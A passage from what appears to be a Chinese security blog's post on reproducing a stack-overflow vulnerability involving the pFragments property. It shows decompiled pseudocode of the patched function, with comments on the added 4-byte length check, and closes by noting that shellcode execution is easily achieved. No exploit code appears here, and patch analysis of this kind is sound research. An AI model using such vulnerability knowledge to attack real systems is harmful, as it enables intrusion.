</span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//补丁后关键函数关键代码  </span></span><br><span class="line"><span class="type">char</span> __userpurge sub_32E0239B@&lt;al&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> *a5, <span class="type">int</span> a6)  </span><br><span class="line">&#123;  </span><br><span class="line">    ......  </span><br><span class="line">    <span class="keyword">if</span> ( a6 )  </span><br><span class="line">    &#123;  </span><br><span class="line">        v7 = *(_DWORD *)(sub_327DAFBD(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);<span class="comment">// v7为关键对象首地址  </span></span><br><span class="line">        v16 = <span class="number">0</span>;  </span><br><span class="line">        v15 = <span class="number">83886080</span>;  </span><br><span class="line">        <span class="comment">// 这些条件则为补丁代码  </span></span><br><span class="line">        <span class="keyword">if</span> ( v7                                     <span class="comment">// 关键对象首地址不为0  </span></span><br><span class="line">            &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">int</span> (__stdcall **)(<span class="type">int</span>))(*(_DWORD *)v7 + <span class="number">48</span>))(v7) &lt;= <span class="number">4</span><span class="comment">// 复制数据长度不能大于4  </span></span><br><span class="line">            &amp;&amp; (*(<span class="type">int</span> (__stdcall **)(<span class="type">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a4<span class="comment">// 关键对象第一个成员变量&gt;a4  </span></span><br><span class="line">            &amp;&amp; (*(<span class="type">int</span> (__stdcall **)(<span class="type">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a3<span class="comment">// 关键对象第一个成员变量&gt;a3  </span></span><br><span class="line">            &amp;&amp; a3 &gt;= <span class="number">0</span>  </span><br><span class="line">            &amp;&amp; a4 &gt;= <span class="number">0</span>  </span><br><span class="line">            <span class="comment">// 将pFragments属性数据复制到栈上的虚函数  </span></span><br><span class="line">            &amp;&amp; ((*(<span class="type">void</span> (__stdcall **)(<span class="type">int</span>, <span class="type">int</span> *, <span class="type">int</span>))(*(_DWORD *)v7 + <span class="number">28</span>))(v7, &amp;v14, a3),  </span><br><span class="line">            (<span class="type">unsigned</span> __int8)sub_32E02258(v14, a2, a5 != <span class="number">0</span> ? (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v16 : <span class="number">0</span>, a6)) )  </span><br><span class="line">        &#123;  </span><br><span class="line">            ......  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            result = <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        sub_32E197A4(<span class="number">863334498</span>);  </span><br><span class="line">        result = <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到<code>补丁</code>后的<code>关键函数</code>中只有满足了那个<code>关键if</code>中的<code>很多条件</code>才能执行到将<code>pFragments属性数据</code>复制到<code>栈上</code>的<code>虚函数</code>。因为涉及到了<code>很多虚函数</code>，只是<code>静态分析</code>是不行的，所以要结合<code>动态调试</code>确定<code>虚函数的地址</code>，进而分析<code>虚函数的功能</code>。功能我已经分析完，写在了上面<code>代码的注释</code>中。其中<code>第一个条件</code>就是判断<code>pFragments属性数据长度</code>的。如果pFragments属性数据<code>大于4字节</code>，则不再执行<code>内存复制</code>，直接返回，从而解决了此漏洞。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞可以来说是非常简单的入门级漏洞了，对于漏洞复现，也是入门的栈溢出漏洞，我们非常容易就可以劫持程序流执行ShellCode，但是对于我们在二进制安全的道路上任重而道远，继续加油！</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
